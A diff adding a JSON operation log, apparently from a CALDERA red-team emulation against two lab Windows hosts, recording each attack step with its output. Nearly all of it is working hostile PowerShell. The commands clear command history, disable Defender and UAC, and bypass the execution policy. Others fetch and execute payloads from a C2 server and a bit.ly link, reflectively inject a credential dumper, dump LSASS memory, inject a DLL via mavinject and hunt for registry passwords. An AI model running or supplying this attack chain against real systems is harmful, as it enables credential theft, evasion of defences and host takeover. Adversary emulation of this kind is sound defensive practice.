@@ -1,0 +1,1064 @@
+{
+  "name": "1337 h4x0r",
+  "host_group": [
+    {
+      "platform": "windows",
+      "watchdog": 0,
+      "pending_contact": "HTTP",
+      "exe_name": "oompa_loompa.exe",
+      "paw": "mjicsx",
+      "username": "WIN-FU3EB5AE1MQ\\Administrator",
+      "sleep_min": 30,
+      "display_name": "WIN-FU3EB5AE1MQ$WIN-FU3EB5AE1MQ\\Administrator",
+      "host": "WIN-FU3EB5AE1MQ",
+      "location": "C:\\Users\\Public\\oompa_loompa.exe",
+      "trusted": true,
+      "server": "http://192.168.122.197:8888",
+      "host_ip_addrs": [
+        "192.168.122.68"
+      ],
+      "pid": 4856,
+      "group": "red",
+      "architecture": "amd64",
+      "links": [
+        {
+          "collect": "2023-03-18T00:13:34Z",
+          "used": [],
+          "paw": "mjicsx",
+          "deadman": false,
+          "output": "False",
+          "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+          "host": "WIN-FU3EB5AE1MQ",
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "pid": "4920",
+          "pin": 0,
+          "agent_reported_time": "2023-03-18T00:13:34Z",
+          "unique": "7db26bd2-e88d-46ff-b2c1-3a74f7219f7c",
+          "ability": {
+            "requirements": [],
+            "access": {},
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "additional_info": {},
+            "buckets": [
+              "defense-evasion"
+            ],
+            "singleton": false,
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "description": "Stop terminal from logging history",
+            "delete_payload": true,
+            "technique_id": "T1070.003",
+            "tactic": "defense-evasion",
+            "repeatable": false,
+            "plugin": "stockpile",
+            "name": "Avoid logs",
+            "privilege": null,
+            "executors": [
+              {
+                "platform": "darwin",
+                "additional_info": {},
+                "build_target": null,
+                "uploads": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "parsers": [],
+                "payloads": [],
+                "language": null,
+                "name": "sh",
+                "cleanup": [],
+                "variations": [],
+                "timeout": 60,
+                "code": null
+              },
+              {
+                "platform": "linux",
+                "additional_info": {},
+                "build_target": null,
+                "uploads": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "parsers": [],
+                "payloads": [],
+                "language": null,
+                "name": "sh",
+                "cleanup": [],
+                "variations": [],
+                "timeout": 60,
+                "code": null
+              },
+              {
+                "platform": "windows",
+                "additional_info": {},
+                "build_target": null,
+                "uploads": [],
+                "command": "Clear-History;Clear",
+                "parsers": [],
+                "payloads": [],
+                "language": null,
+                "name": "psh",
+                "cleanup": [],
+                "variations": [],
+                "timeout": 60,
+                "code": null
+              }
+            ]
+          },
+          "finish": "2023-03-18T00:13:35Z",
+          "cleanup": 0,
+          "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+          "status": 0,
+          "score": 0,
+          "relationships": [],
+          "executor": {
+            "platform": "windows",
+            "additional_info": {},
+            "build_target": null,
+            "uploads": [],
+            "command": "Clear-History;Clear",
+            "parsers": [],
+            "payloads": [],
+            "language": null,
+            "name": "psh",
+            "cleanup": [],
+            "variations": [],
+            "timeout": 60,
+            "code": null
+          },
+          "decide": "2023-03-18T00:13:34Z",
+          "jitter": 0,
+          "facts": [],
+          "id": "7db26bd2-e88d-46ff-b2c1-3a74f7219f7c"
+        }
+      ],
+      "contact": "HTTP",
+      "ppid": 4636,
+      "deadman_enabled": true,
+      "proxy_chain": [],
+      "privilege": "Elevated",
+      "executors": [
+        "cmd",
+        "psh",
+        "proc"
+      ],
+      "origin_link_id": "",
+      "available_contacts": [
+        "HTTP"
+      ],
+      "upstream_dest": "http://192.168.122.197:8888",
+      "proxy_receivers": {},
+      "created": "2023-03-18T00:13:34Z",
+      "sleep_max": 60,
+      "last_seen": "2023-03-18T01:15:33Z"
+    },
+    {
+      "platform": "windows",
+      "watchdog": 0,
+      "pending_contact": "HTTP",
+      "exe_name": "oompa_loompa.exe",
+      "paw": "rojqgq",
+      "username": "DESKTOP-MS757AE\\Derp",
+      "sleep_min": 30,
+      "display_name": "DESKTOP-MS757AE$DESKTOP-MS757AE\\Derp",
+      "host": "DESKTOP-MS757AE",
+      "location": "C:\\Users\\Public\\oompa_loompa.exe",
+      "trusted": true,
+      "server": "http://192.168.122.197:8888",
+      "host_ip_addrs": [
+        "192.168.122.238"
+      ],
+      "pid": 6588,
+      "group": "red",
+      "architecture": "amd64",
+      "links": [
+        {
+          "collect": "2023-03-18T00:14:15Z",
+          "used": [],
+          "paw": "rojqgq",
+          "deadman": false,
+          "output": "False",
+          "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+          "host": "DESKTOP-MS757AE",
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "pid": "3428",
+          "pin": 0,
+          "agent_reported_time": "2023-03-18T00:14:15Z",
+          "unique": "6682cb56-498a-4013-9b24-87873f994d9c",
+          "ability": {
+            "requirements": [],
+            "access": {},
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "additional_info": {},
+            "buckets": [
+              "defense-evasion"
+            ],
+            "singleton": false,
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "description": "Stop terminal from logging history",
+            "delete_payload": true,
+            "technique_id": "T1070.003",
+            "tactic": "defense-evasion",
+            "repeatable": false,
+            "plugin": "stockpile",
+            "name": "Avoid logs",
+            "privilege": null,
+            "executors": [
+              {
+                "platform": "darwin",
+                "additional_info": {},
+                "build_target": null,
+                "uploads": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "parsers": [],
+                "payloads": [],
+                "language": null,
+                "name": "sh",
+                "cleanup": [],
+                "variations": [],
+                "timeout": 60,
+                "code": null
+              },
+              {
+                "platform": "linux",
+                "additional_info": {},
+                "build_target": null,
+                "uploads": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "parsers": [],
+                "payloads": [],
+                "language": null,
+                "name": "sh",
+                "cleanup": [],
+                "variations": [],
+                "timeout": 60,
+                "code": null
+              },
+              {
+                "platform": "windows",
+                "additional_info": {},
+                "build_target": null,
+                "uploads": [],
+                "command": "Clear-History;Clear",
+                "parsers": [],
+                "payloads": [],
+                "language": null,
+                "name": "psh",
+                "cleanup": [],
+                "variations": [],
+                "timeout": 60,
+                "code": null
+              }
+            ]
+          },
+          "finish": "2023-03-18T00:14:16Z",
+          "cleanup": 0,
+          "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+          "status": 0,
+          "score": 0,
+          "relationships": [],
+          "executor": {
+            "platform": "windows",
+            "additional_info": {},
+            "build_target": null,
+            "uploads": [],
+            "command": "Clear-History;Clear",
+            "parsers": [],
+            "payloads": [],
+            "language": null,
+            "name": "psh",
+            "cleanup": [],
+            "variations": [],
+            "timeout": 60,
+            "code": null
+          },
+          "decide": "2023-03-18T00:14:15Z",
+          "jitter": 0,
+          "facts": [],
+          "id": "6682cb56-498a-4013-9b24-87873f994d9c"
+        }
+      ],
+      "contact": "HTTP",
+      "ppid": 1364,
+      "deadman_enabled": true,
+      "proxy_chain": [],
+      "privilege": "Elevated",
+      "executors": [
+        "cmd",
+        "psh",
+        "proc"
+      ],
+      "origin_link_id": "",
+      "available_contacts": [
+        "HTTP"
+      ],
+      "upstream_dest": "http://192.168.122.197:8888",
+      "proxy_receivers": {},
+      "created": "2023-03-18T00:14:15Z",
+      "sleep_max": 60,
+      "last_seen": "2023-03-18T01:15:36Z"
+    }
+  ],
+  "start": "2023-03-18T01:11:28Z",
+  "steps": {
+    "mjicsx": {
+      "steps": [
+        {
+          "link_id": "dc40f183-f3ec-4e73-99a4-d2275497be90",
+          "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
+          "command": "arp -a",
+          "plaintext_command": "arp -a",
+          "delegated": "2023-03-18T01:11:55Z",
+          "run": "2023-03-18T01:12:00Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 4876,
+          "description": "Locate all active IP and FQDNs on the network",
+          "name": "Collect ARP details",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Remote System Discovery",
+            "technique_id": "T1018"
+          },
+          "output": {
+            "stdout": "Interface: 192.168.122.68 --- 0x5  Internet Address      Physical Address      Type  192.168.122.1         52-54-00-5b-5d-42     dynamic     192.168.122.197       52-54-00-3c-c0-d4     dynamic     192.168.122.255       ff-ff-ff-ff-ff-ff     static      224.0.0.22            01-00-5e-00-00-16     static      224.0.0.251           01-00-5e-00-00-fb     static      224.0.0.252           01-00-5e-00-00-fc     static      239.255.255.250       01-00-5e-7f-ff-fa     static      255.255.255.255       ff-ff-ff-ff-ff-ff     static    ",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:12:00Z"
+        },
+        {
+          "link_id": "5c7631f6-1d12-40ff-9dd6-9415e1339741",
+          "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+          "command": "Clear-History;Clear",
+          "plaintext_command": "Clear-History;Clear",
+          "delegated": "2023-03-18T01:12:09Z",
+          "run": "2023-03-18T01:12:44Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 620,
+          "description": "Stop terminal from logging history",
+          "name": "Avoid logs",
+          "attack": {
+            "tactic": "defense-evasion",
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "technique_id": "T1070.003"
+          },
+          "agent_reported_time": "2023-03-18T01:12:44Z"
+        },
+        {
+          "link_id": "17a81f4d-798d-45e7-9a6c-d46143933686",
+          "ability_id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e",
+          "command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;        $shell = New-Object -ComObject Wscript.Shell        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")",
+          "plaintext_command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;        $shell = New-Object -ComObject Wscript.Shell        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")",
+          "delegated": "2023-03-18T01:12:17Z",
+          "run": "2023-03-18T01:12:44Z",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 2364,
+          "description": "Ensure the ExecutionPolicy is turned to Bypass",
+          "name": "Bypass ExecutionPolicy",
+          "attack": {
+            "tactic": "defense-evasion",
+            "technique_name": "Impair Defenses: Disable or Modify Tools",
+            "technique_id": "T1562.001"
+          },
+          "output": {
+            "stdout": "Set-ItemProperty : Cannot find path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell' because it does not exist.At line:1 char:1+ Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Powe ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...dows\\PowerShell:String) [Set-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand You cannot call a method on a null-valued expression.At line:1 char:121+ ... ass;        $shell = New-Object -ComObject Wscript.Shell        Set-E ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull ",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:12:44Z"
+        },
+        {
+          "link_id": "32f31c49-547d-410b-a9e8-349092104d37",
+          "ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
+          "command": "$url=\"http://192.168.122.197:8888/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group red\"; };Receive-Job -Job $job -Wait;",
+          "plaintext_command": "$url=\"http://192.168.122.197:8888/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group red\"; };Receive-Job -Job $job -Wait;",
+          "delegated": "2023-03-18T01:12:21Z",
+          "run": "2023-03-18T01:13:44Z",
+          "status": 124,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1636,
+          "description": "Bypass user account controls - medium",
+          "name": "Bypass UAC Medium",
+          "attack": {
+            "tactic": "privilege-escalation",
+            "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
+            "technique_id": "T1548.002"
+          },
+          "output": {
+            "stdout": "Timeout reached, process killedSTDOUT:STDERR:",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:12:44Z"
+        },
+        {
+          "link_id": "9267b269-47bb-46cb-9905-ddcf1cd3d50f",
+          "ability_id": "3aad5312-d48b-4206-9de4-39866c12e60f",
+          "command": "reg query HKCU /f password /t REG_SZ /s",
+          "plaintext_command": "reg query HKCU /f password /t REG_SZ /s",
+          "delegated": "2023-03-18T01:12:46Z",
+          "run": "2023-03-18T01:13:35Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 3304,
+          "description": "Search for possible credentials stored in Registry",
+          "name": "Credentials in Registry - HKCU",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "Unsecured Credentials: Credentials in Registry",
+            "technique_id": "T1552.002"
+          },
+          "output": {
+            "stdout": "HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Local Settings\\ImmutableMuiCache\\Strings\\52C64B7E    @%SystemRoot%\\System32\\usercpl.dll,-2#immutable1    REG_SZ    Change user account settings and passwords for people who share this computer.HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Local Settings\\MrtCache\\C:%5CWindows%5CSystemResources%5CWindows.UI.SettingsAppThreshold%5CWindows.UI.SettingsAppThreshold.pri\\1d401e478daea89\\d3f2dfb1    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SettingsPageAccountsManage/HighKeywords}    REG_SZ    change;fingerprint fingerprints;login;password passwords;picture pictures;sign-in    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_SyncSettings_SyncCredentials_Toggle/Description}    REG_SZ    Sync your passwords on this PC    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_SyncSettings_SyncCredentials_Toggle/HighKeywords}    REG_SZ    HomeGroup HomeGroups;password passwords    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_ChangePassword/Description}    REG_SZ    Change your password    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_ChangePassword/HighKeywords}    REG_SZ    add;change;password    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PicturePassword/Description}    REG_SZ    Set up a picture password    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PicturePassword/HighKeywords}    REG_SZ    photo photos;picture pictures;password    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PINPassword/Description}    REG_SZ    Set up PIN sign-in    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PINPassword/HighKeywords}    REG_SZ    work;passport;corporate;organization;store;add;change;remove;delete;reset;forgot;PIN PINs;End of search: 14 match(es) found.",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:13:34Z"
+        },
+        {
+          "link_id": "e99e7210-c5d7-4ae0-bb92-0acfe99f62df",
+          "ability_id": "b007f6e8-4a87-4440-8888-29ceab047d9b",
+          "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;",
+          "plaintext_command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;",
+          "delegated": "2023-03-18T01:13:00Z",
+          "run": "2023-03-18T01:13:35Z",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 4420,
+          "description": "Disable Windows Defender All",
+          "name": "Disable Windows Defender All",
+          "attack": {
+            "tactic": "defense-evasion",
+            "technique_name": "Impair Defenses: Disable or Modify Tools",
+            "technique_id": "T1562.001"
+          },
+          "output": {
+            "stdout": "Set-MpPreference : A parameter cannot be found that matches parameter name 'EnableControlledFolderAccess'.At line:1 char:217+ ... Scanning $true;Set-MpPreference -EnableControlledFolderAccess Disable ...+                                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: (:) [Set-MpPreference], ParameterBindingException    + FullyQualifiedErrorId : NamedParameterNotFound,Set-MpPreference ",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:13:34Z"
+        },
+        {
+          "link_id": "8e1d8f5f-6b2a-44aa-bc2a-4ee7797a48ea",
+          "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
+          "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value",
+          "plaintext_command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value",
+          "delegated": "2023-03-18T01:13:10Z",
+          "run": "2023-03-18T01:13:35Z",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1272,
+          "description": "Identify AV",
+          "name": "Discover antivirus programs",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Software Discovery: Security Software Discovery",
+            "technique_id": "T1518.001"
+          },
+          "output": {
+            "stdout": "ERROR:\rDescription = Invalid namespace\r",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:13:34Z"
+        },
+        {
+          "link_id": "e67cc7fa-ea38-4d9d-ab7e-910206b7a85f",
+          "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7",
+          "command": "$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };$valid | ConvertTo-Json",
+          "plaintext_command": "$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };$valid | ConvertTo-Json",
+          "delegated": "2023-03-18T01:13:15Z",
+          "run": "2023-03-18T01:13:36Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 4156,
+          "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
+          "name": "Discover injectable process",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Process Discovery",
+            "technique_id": "T1057"
+          },
+          "output": {
+            "stdout": "Exception calling \"GetOwner\" : \"Not found \"At line:1 char:38+ ... wmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps =  ...+                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : WMIMethodException ",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:13:34Z"
+        },
+        {
+          "link_id": "2c953fba-4eb7-4c95-b7d7-6bab95729b72",
+          "ability_id": "14a21534-350f-4d83-9dd7-3c56b93a0c17",
+          "command": "nbtstat -n",
+          "plaintext_command": "nbtstat -n",
+          "delegated": "2023-03-18T01:13:26Z",
+          "run": "2023-03-18T01:13:35Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 3416,
+          "description": "Find Domain information",
+          "name": "Find Domain",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "output": {
+            "stdout": "    Ethernet Instance 0:Node IpAddress: [192.168.122.68] Scope Id: []                NetBIOS Local Name Table       Name               Type         Status    ---------------------------------------------    WORKGROUP      <00>  GROUP       Registered     WIN-FU3EB5AE1MQ<00>  UNIQUE      Registered     WIN-FU3EB5AE1MQ<20>  UNIQUE      Registered ",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:13:34Z"
+        },
+        {
+          "link_id": "f28dc3b2-3830-454b-b173-e0915ca9aff1",
+          "ability_id": "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7",
+          "command": "$url=\"http://192.168.122.197:8888/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"file\",\"debugger.dll\");$PBytes = $wc.DownloadData($url);$wc1 = New-Object System.net.webclient;$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");IEX ($wc1.DownloadString($url));Invoke-ReflectivePEInjection -PBytes $PBytes -verbose",
+          "plaintext_command": "$url=\"http://192.168.122.197:8888/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"file\",\"debugger.dll\");$PBytes = $wc.DownloadData($url);$wc1 = New-Object System.net.webclient;$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");IEX ($wc1.DownloadString($url));Invoke-ReflectivePEInjection -PBytes $PBytes -verbose",
+          "delegated": "2023-03-18T01:13:57Z",
+          "run": "2023-03-18T01:14:31Z",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 4544,
+          "description": "Injects cred dumper exe into an available process",
+          "name": "Inject Cred dumper into process (Spookier)",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "Process Injection: Portable Executable Injection",
+            "technique_id": "T1055.002"
+          },
+          "output": {
+            "stdout": "VERBOSE: PowerShell ProcessID: 4544VERBOSE: Calling Invoke-MemoryLoadLibraryVERBOSE: Getting basic PE information from the fileVERBOSE: Allocating memory for the PE and write its headers to memoryVERBOSE: Getting detailed PE information from the headers loaded in memoryVERBOSE: StartAddress: 0x0000016874850000    EndAddress: 0x0000016874A30000VERBOSE: Copy PE sections in to memoryVERBOSE: Update memory addresses based on where the PE was actually loaded in memoryVERBOSE: Import DLL's needed by the PE we are loadingVERBOSE: Done importing DLL importsVERBOSE: Update memory protection flagsVERBOSE: Calling dllmain so the DLL knows it has been loadedVERBOSE: Calling function with Void return type[ ] Starting Enum-DumpProcessMemory[ ] Find LSASS[-] PID            : 564[-] Process Handle : 2684[-] File Handle    : 2700[+] Process memory dump successfulVERBOSE: Done unloading the libraries needed by the PEVERBOSE: Calling dllmain so the DLL knows it is being unloaded",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:14:19Z"
+        },
+        {
+          "link_id": "342577ac-0b0e-4ca5-b145-d6014c70f13c",
+          "ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554",
+          "command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";$download_folder = \"C:\\Users\\Public\\\";$staging_folder = \"C:\\Users\\Public\\temp\";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;$arch=[System.Environment]::Is64BitOperatingSystem;if ($arch) {    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;} else {    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;}remove-item $staging_folder -Recurse;",
+          "plaintext_command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";$download_folder = \"C:\\Users\\Public\\\";$staging_folder = \"C:\\Users\\Public\\temp\";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;$arch=[System.Environment]::Is64BitOperatingSystem;if ($arch) {    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;} else {    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;}remove-item $staging_folder -Recurse;",
+          "delegated": "2023-03-18T01:14:21Z",
+          "run": "2023-03-18T01:15:01Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 4524,
+          "description": "Dump lsass for later use with mimikatz",
+          "name": "Leverage Procdump for lsass memory",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "OS Credential Dumping: LSASS Memory",
+            "technique_id": "T1003.001"
+          },
+          "agent_reported_time": "2023-03-18T01:14:59Z"
+        },
+        {
+          "link_id": "7d7c9f5e-8a57-4cf9-869b-63361c7fb5a7",
+          "ability_id": "bfff9006-d1fb-46ce-b173-92cb04e9a031",
+          "command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\")",
+          "plaintext_command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\")",
+          "delegated": "2023-03-18T01:14:36Z",
+          "run": "2023-03-18T01:15:00Z",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 4792,
+          "description": "Download",
+          "name": "PowerShell bitly Link Download",
+          "attack": {
+            "tactic": "execution",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "technique_id": "T1059.001"
+          },
+          "output": {
+            "stdout": "Exception calling \"DownloadString\" with \"1\" argument(s): \"The request was aborted: Could not create SSL/TLS secure channel.\"At line:1 char:1+ powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"http ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : WebException ",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:14:59Z"
+        },
+        {
+          "link_id": "d9cac36c-7338-4c5e-8af6-603eb2e0af56",
+          "ability_id": "e5bcefee-262d-4568-a261-e8a20855ec81",
+          "command": "$explorer = Get-Process -Name explorer;mavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll",
+          "plaintext_command": "$explorer = Get-Process -Name explorer;mavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll",
+          "delegated": "2023-03-18T01:14:52Z",
+          "run": "2023-03-18T01:15:00Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 2092,
+          "description": "Leverage Mavinject (signed binary) for DLL injection",
+          "name": "Signed Binary Execution - Mavinject",
+          "attack": {
+            "tactic": "defense-evasion",
+            "technique_name": "Process Injection: Portable Executable Injection",
+            "technique_id": "T1055.002"
+          },
+          "agent_reported_time": "2023-03-18T01:14:59Z"
+        },
+        {
+          "link_id": "3f56943d-5ba1-48fa-8c86-80a7e003f409",
+          "ability_id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c",
+          "command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force",
+          "plaintext_command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force",
+          "delegated": "2023-03-18T01:15:09Z",
+          "run": "2023-03-18T01:15:33Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 5100,
+          "description": "Set a registry key to allow UAC bypass",
+          "name": "UAC bypass registry",
+          "attack": {
+            "tactic": "privilege-escalation",
+            "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
+            "technique_id": "T1548.002"
+          },
+          "output": {
+            "stdout": "EnableLUA    : 0PSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\policie               s\\systemPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\policie               sPSChildName  : systemPSDrive      : HKLMPSProvider   : Microsoft.PowerShell.Core\\Registry",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-03-18T01:15:33Z"
+        }
+      ]
+    },
+    "rojqgq": {
+      "steps": []
+    }
+  },
+  "finish": null,
